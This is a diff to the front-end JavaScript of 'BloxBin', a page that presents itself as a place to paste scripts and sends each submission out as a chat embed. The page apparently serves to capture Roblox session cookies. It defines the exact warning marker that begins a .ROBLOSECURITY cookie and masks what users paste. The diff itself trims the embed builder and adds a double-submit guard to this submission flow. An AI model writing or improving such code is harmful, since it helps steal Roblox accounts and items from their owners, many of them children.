@@ -7,12 +7,12 @@
   const charCountEl = document.getElementById("char-count");
 
   const EMBED_DESC_LIMIT = 4096;
-  const EMBED_FIELD_LIMIT = 1024;
-  const EMBED_MAX_FIELDS = 25;
   const CENSOR_CHAR = "•";
 
   const ROBLOX_WARNING_MARKER =
     "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+
+  let submitting = false;
 
   mask.dataset.placeholder = "Paste your script…";
 
@@ -36,42 +36,12 @@
     return normalized;
   }
 
-  function codeBlock(text) {
-    return "```\n" + text + "\n```";
-  }
-
   function buildEmbed(text) {
-    const embed = {
+    return {
       title: "BloxBin Submission",
       color: 0x4f7df5,
-      timestamp: new Date().toISOString(),
+      description: text.slice(0, EMBED_DESC_LIMIT),
     };
-
-    const descOverhead = 8;
-    const maxDescText = EMBED_DESC_LIMIT - descOverhead;
-
-    if (text.length <= maxDescText) {
-      embed.description = codeBlock(text);
-      return embed;
-    }
-
-    embed.description = codeBlock(text.slice(0, maxDescText));
-    let rest = text.slice(maxDescText);
-    embed.fields = [];
-
-    const fieldOverhead = 8;
-    const maxFieldText = EMBED_FIELD_LIMIT - fieldOverhead;
-
-    for (let i = 0; i < EMBED_MAX_FIELDS && rest.length > 0; i++) {
-      const chunk = rest.slice(0, maxFieldText);
-      embed.fields.push({
-        name: "Continued (" + (i + 1) + ")",
-        value: codeBlock(chunk),
-      });
-      rest = rest.slice(maxFieldText);
-    }
-
-    return embed;
   }
 
   function syncMask() {
@@ -132,6 +102,10 @@
   form.addEventListener("submit", async function (event) {
     event.preventDefault();
 
+    if (submitting) {
+      return;
+    }
+
     const text = input.value.trim();
 
     if (!text) {
@@ -140,6 +114,7 @@
       return;
     }
 
+    submitting = true;
     setLoading(true);
     setStatus("Securing and submitting…");
 
@@ -151,6 +126,7 @@
     } catch {
       setStatus("Something went wrong. Please try again.", "error");
     } finally {
+      submitting = false;
       setLoading(false);
     }
   });
